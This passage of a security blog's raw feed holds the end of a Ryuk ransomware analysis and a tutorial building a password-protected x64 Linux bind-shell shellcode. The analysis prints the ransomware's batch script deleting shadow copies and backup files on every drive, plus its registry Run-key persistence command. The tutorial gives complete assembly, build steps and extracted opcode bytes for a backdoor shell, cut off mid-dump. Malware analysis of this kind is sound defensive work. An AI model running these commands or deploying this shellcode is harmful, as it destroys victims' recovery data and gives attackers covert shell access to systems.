Offset: 400 Decrypted String: VirtualAlloc
Offset: 450 Decrypted String: CloseHandle
Offset: 500 Decrypted String: GetWindowsDirectoryW
Offset: 550 Decrypted String: CreateDirectoryW
Offset: 600 Decrypted String: CreateFileW
Offset: 650 Decrypted String: WriteFile
Offset: 700 Decrypted String: CreateProcessW
Offset: 750 Decrypted String: GetModuleHandleA
Offset: 800 Decrypted String: CreateProcessA
Offset: 850 Decrypted String: CopyFileA
Offset: 900 Decrypted String: GetCommandLineW
Offset: 950 Decrypted String: FreeLibrary
Offset: 1000 Decrypted String: GlobalAlloc
Offset: 1050 Decrypted String: GetModuleFileNameW
Offset: 1100 Decrypted String: Wow64DisableWow64FsRedirection
Offset: 1150 Decrypted String: SetFileAttributesA
Offset: 1200 Decrypted String: CopyFileW
Offset: 1250 Decrypted String: DeleteFileW
Offset: 1300 Decrypted String: ReadFile
Offset: 1350 Decrypted String: GetFileSize
Offset: 1400 Decrypted String: GetVersionExW
Offset: 1450 Decrypted String: GetFileAttributesW
Offset: 1500 Decrypted String: GetFileAttributesA
Offset: 1550 Decrypted String: FindClose
Offset: 1600 Decrypted String: WinExec
Offset: 1650 Decrypted String: Sleep
Offset: 1700 Decrypted String: ExitProcess
Offset: 1750 Decrypted String: GetCurrentProcess
Offset: 1800 Decrypted String: GetLogicalDrives
Offset: 1850 Decrypted String: SetFileAttributesW
Offset: 1900 Decrypted String: GetStartupInfoW
Offset: 1950 Decrypted String: GetTickCount
Offset: 2000 Decrypted String: GetDriveTypeW
Offset: 2050 Decrypted String: mpr.dll
Offset: 2100 Decrypted String: WNetOpenEnumW
Offset: 2150 Decrypted String: WNetEnumResourceW
Offset: 2200 Decrypted String: WNetCloseEnum
Offset: 2250 Decrypted String: advapi32.dll
Offset: 2300 Decrypted String: CryptEncrypt
Offset: 2350 Decrypted String: CryptDecrypt
Offset: 2400 Decrypted String: CryptGenKey
Offset: 2450 Decrypted String: CryptDestroyKey
Offset: 2500 Decrypted String: CryptExportKey
Offset: 2550 Decrypted String: CryptImportKey
Offset: 2600 Decrypted String: CryptDeriveKey
Offset: 2650 Decrypted String: CryptAcquireContextW
Offset: 2700 Decrypted String: GetUserNameA
Offset: 2750 Decrypted String: GetUserNameW
Offset: 2800 Decrypted String: RegOpenKeyExA
Offset: 2850 Decrypted String: RegOpenKeyExW
Offset: 2900 Decrypted String: RegQueryValueExA
Offset: 2950 Decrypted String: RegCloseKey
Offset: 3000 Decrypted String: RegDeleteValueW
Offset: 3050 Decrypted String: RegSetValueExW
Offset: 3100 Decrypted String: ole32.dll
Offset: 3150 Decrypted String: CoInitialize
Offset: 3200 Decrypted String: CoCreateInstance
Offset: 3250 Decrypted String: Shell32.dll
Offset: 3300 Decrypted String: ShellExecuteW
Offset: 3350 Decrypted String: ShellExecuteA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;changing-drive-permissions&quot;&gt;Changing Drive Permissions&lt;/h2&gt;

&lt;p&gt;Ryuk changes the permissions of all Logical drives using icacls.exe:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201113214010779.png&quot; alt=&quot;image-20201113214010779&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;deleting-backups&quot;&gt;Deleting Backups&lt;/h2&gt;

&lt;p&gt;Ryuk deletes the shadow copies with WMI and vssadmin.exe:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201113225157090.png&quot; alt=&quot;image-20201113225157090&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ryuk also drops a batch script to disk to delete all shadow copies and all possible backups:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
del %0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The batch script deletes itself at the end.&lt;/p&gt;

&lt;h2 id=&quot;encryption-routine&quot;&gt;Encryption Routine&lt;/h2&gt;

&lt;p&gt;Ryuk uses a “multi thread” to encrypt files since it will create a new thread for each file it tries to encrypt, making the encryption process really fast. Ryuk uses AES-256 to encrypt files and RSA to encrypt the AES key and append it at the end of every encrypted file. This way only the authors behind the ransomware can decrypt the AES keys used to encrypt the files, since only them have the RSA private key. Ryuk uses the Microsoft CryptoAPI to encrypt the files.&lt;/p&gt;

&lt;p&gt;List of APIs used for encryption:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CryptAquireContextW
CryptImportKey
CryptGenKey
CryptEncrypt
CryptDestroyKey
CryptDeriveKey
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ryuk starts gathering all the system files and for every file it creates a new thread to encrypt. The following keywords are whitelisted by this Ryuk sample:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dll
hrmlog
exe
.ini
.lnk
bootmgr
boot
RyukReadMe.html
UNIQUE_ID_DO_NOT_REMOVE
boot
PUBLIC
PRIVATE
\\Windows\\
sysvol
netlogon
bin
boot
Boot
dev
etc
lib
initrd
sbin
sys
vmlinuz
run
var
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before starting the encryption Ryuk imports the public RSA key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114154623482.png&quot; alt=&quot;image-20201114154623482&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then for every file it creates a new AES 256 key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114155412166.png&quot; alt=&quot;image-20201114155412166&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And goes into a loop to encrypt chunks of data with 1000000 bytes, each:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114162805206.png&quot; alt=&quot;image-20201114162805206&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the end Ryuk adds a specific block of meta data at the end of the encrypted data containing the marker “HERMES” plus the encrypted AES key used for encryption.&lt;/p&gt;

&lt;p&gt;Writing the marker to the file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114165027425.png&quot; alt=&quot;image-20201114165027425&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exporting the AES key, encrypting it with the RSA public key and writing it to the file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114165849618.png&quot; alt=&quot;image-20201114165849618&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ryuk checks if the file to be encrypted contains the “HERMES” marker and if does it will skip the encryption:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114162348880.png&quot; alt=&quot;image-20201114162348880&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This way, it avoids encrypting files twice.&lt;/p&gt;

&lt;h2 id=&quot;encrypting-network-resources&quot;&gt;Encrypting Network Resources&lt;/h2&gt;

&lt;p&gt;Ryuk also tries to encrypt network shares and for each network share it finds it will add it to a list delimited by “;” for later encryption using the same methods.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114175637000.png&quot; alt=&quot;image-20201114175637000&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;persistence&quot;&gt;Persistence&lt;/h2&gt;

&lt;p&gt;A run key for persistence is added to the windows registry by spawning a new cmd.exe process to run a reg add command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201113211932066.png&quot; alt=&quot;image-20201113211932066&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List of commands used for persistence:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cmd.exe /C REG ADD &quot;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\&quot; /v &quot;svchos&quot; /t REG_SZ /d &quot;[Path 2 Exe]&quot; /f

cmd.exe /C REG ADD &quot;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\&quot; /v &quot;svchos&quot; /t REG_SZ /d &quot;[Path 2 Exe]&quot; /f /reg:64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ryukreadmehtml&quot;&gt;RyukReadMe.html&lt;/h2&gt;

&lt;p&gt;Ryuk writes a HTML file named RyukReadMe.html&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114170637076.png&quot; alt=&quot;image-20201114170637076&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This data is encrypted and after reversing the algorithm it was possible to get the plain text data for the HTML file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114171503872.png&quot; alt=&quot;image-20201114171503872&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RyukReadMe.html:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201114171600414.png&quot; alt=&quot;image-20201114171600414&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sample-iocs&quot;&gt;Sample IOCs&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pakuroume1977@protonmail.com
SHA256: 40B865D1C3AB1B8544BCF57C88EDD30679870D40B27D62FEB237A19F0C5F9CD1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That’s all for this malware reversing blog post!&lt;/p&gt;

&lt;p&gt;Here’s a list of useful resources about some campaigns that finished with Ryuk being deployed:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://thedfirreport.com/2020/10/08/ryuks-return/&quot;&gt;https://thedfirreport.com/2020/10/08/ryuks-return/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/&quot;&gt;https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=BhjQ6zsCVSc&amp;amp;feature=emb_title&quot;&gt;https://www.youtube.com/watch?v=BhjQ6zsCVSc&amp;amp;feature=emb_title&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html&quot;&gt;https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The resources above have loads of information about the TTPs used by the actors until they get to the point that the only thing left is to monetize their campaigns to the maximum by deploying the ransomware.&lt;/p&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">Introduction</summary></entry><entry><title type="html">x64 linux bind TCP shellcode (execve /bin/sh) - password protected</title><link href="http://blog.reversing.xyz/x64-linux-shellcode-1.html" rel="alternate" type="text/html" title="x64 linux bind TCP shellcode (execve /bin/sh) - password protected" /><published>2020-10-26T00:00:00+00:00</published><updated>2020-10-26T00:00:00+00:00</updated><id>http://blog.reversing.xyz/x64_linux_shellcode_1</id><content type="html" xml:base="http://blog.reversing.xyz/x64-linux-shellcode-1.html">&lt;p&gt;A traditional bind shell is a type of shell in which the affected host opens up a communication port and waits for an incoming connection.&lt;/p&gt;

&lt;p&gt;When someone connects on that specific port, the affected host copies the stdout, stdin and stderr to that socket and executes a shell giving the attacker a way of executing commands on the system.&lt;/p&gt;

&lt;p&gt;The goal of this blog post is to show the steps required to build a TCP bind shell with an additional security measure, a password. This way, only someone who knows the password will gain access to a shell on the affected system.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Initial definitions for the bind shell&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;; settings
BITS 64
%define     PASSWORD_PROCTECT     ; comment this to not require password
PASSWORD    equ &quot;backdoor&quot;        ; cmp with password. If it's not correct it exits gracefully
PORT        equ 0x5c11            ; default 4444

global _start

_start:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Creating a socket&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;create_socket:
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41 

    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx ; rdx = 0

    add al, 41
    add rdi, 2 ; rdi = 2
    inc rsi ; rsi = 1
    syscall

    ; copy socket descriptor to rdi for future use 
    push rax
    pop rdi ; rdi = sockfd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Creating the sockaddr structure&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;struct_sockaddr: 
    ; server.sin_family = AF_INET 
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = INADDR_ANY
    ; bzero(&amp;amp;server.sin_zero, 8)
    xor rax, rax ; rax = 0
    push rax
    pop rdx ; rdx = 0
    push rax
    mov dword [rsp-4], eax ; INADDR_ANY
    mov word [rsp-6], PORT ; 4444
    mov word [rsp-8], 0x2 ; AF_INET
    sub rsp, 8

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Bind the socket&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;bind_socket:
    ; bind(sock, (struct sockaddr *)&amp;amp;server, sockaddr_len)
    ; syscall number 49
    ; rdi = sockfd
    mov rsi, rsp
    add dl, 16
    add al, 49 ; bind syscall
    syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Set the socket in listen mode&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;listen_socket:
    ; listen(sock, MAX_CLIENTS)
    ; syscall number 50
    ; rdi = sockfd
    xor rax, rax
    push rax
    add al,50
    syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Accept a connection&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;accept_connection:
    ; new = accept(sock, (struct sockaddr *)&amp;amp;client, &amp;amp;sockaddr_len)
    ; syscall number 43
    ; rdi = sockfd
    xor rax, rax
    sub rsp, 16
    mov rsi, rsp ; reserve space on the stack for the client sockaddr structure
    push byte 16
    push rsp
    pop rdx
    add al, 43
    syscall

    ; store the client socket description
    push rax
    pop r15
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Duplicate the file descriptors&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;dup_file_descriptors:
    ; duplicate sockets
    ; dup2 (new, old)
    ; syscall number 33
    ; r15 = new sockfd
    push r15
    pop rdi ; rdi = new sockfd
    xor rsi,rsi ; 0 stdin

loop_dup:
    push byte 33
    pop rax
    syscall
    inc rsi
    cmp rsi, 3
    jnz loop_dup
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Check the password&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If the password is not correct the code will just exit gracefully, otherwise it will execute the execve syscall to open a /bin/sh.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;%ifdef PASSWORD_PROCTECT
check_password:
    ; password = read(fd, *buf, 8)
    ; syscall number 0
    ; rdi = new sockfd
    push rsp
    pop rsi ; rsi = *buf
    xor rdx, rdx
    add dl, 8   ; rdx = 8
    xor rax,rax ; rax = 0 SYS_READ
    syscall

    mov r8, PASSWORD
    cmp qword [rsp], r8
    jnz exit_
%endif

execve_stack:
    xor rax, rax
    push rax
    push rax
    pop rdx
    pop rsi
    push rax
    mov rcx, '/bin//sh'
    push rcx
    push rsp
    pop rdi
    add al, 59 ; execve syscall
    syscall

exit_:
    xor rax, rax
    mov al, 60 ; exit
    syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Compile with nasm:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nasm &lt;span class=&quot;nt&quot;&gt;-felf64&lt;/span&gt; bind.nasm &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; bind.o
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Extract the shellcode:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin2op.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; bind.o

&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ff&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;f6&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;d2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;04&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;29&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;83
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c7&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;02&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ff&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c6&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;44&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;24&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c7&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;44&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;24&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;fa
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;11&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5c&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c7&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;44&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;24&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;f8&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;02
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;83&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ec&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e6
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;04&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;04&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;32&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;83&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ec&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e6&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;54&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;04&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;41&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;41&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;57&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;f6&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;21&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;58&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ff&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c6&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;83&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;fe&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;03&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;75&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;f2
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;54&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5e&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;d2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;49&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b8&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;63&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;72&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;4c
&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;04&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;24&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;75&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;19&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;48&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0
